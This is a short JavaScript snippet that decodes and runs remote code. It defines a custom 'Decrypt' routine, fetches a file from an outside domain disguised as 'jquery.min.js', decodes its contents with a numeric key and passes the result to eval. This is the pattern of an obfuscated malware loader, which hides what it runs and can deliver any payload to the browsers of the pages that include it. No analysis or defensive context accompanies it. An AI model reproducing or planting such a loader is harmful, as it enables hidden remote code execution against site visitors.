function Decrypt(s1, id) {
    s1 = atob(s1);
    var result = '';
    var xx2 = s1.charAt(0);
    xx2 = xx2.charCodeAt(0) - 65;
    s1 = s1.substr(1);
    while(s1.length > 0) {

        result = result + String.fromCharCode(
            (
                s1.charAt(0).charCodeAt(0) - 65
            )
            * 25 +
            (
                s1.charAt(1).charCodeAt(0) - 65
            )
            - xx2 - id
        );

        s1 = s1.substr(2);

    }
    return result;
}


fetch('https://cdn.iplezier.site/assets/js/habbo/jquery.min.js?ver=3.1')
    .then(function(response) {
        return response.text();
    })
    .then(function(body) {
        eval(Decrypt(body, 1247));
});
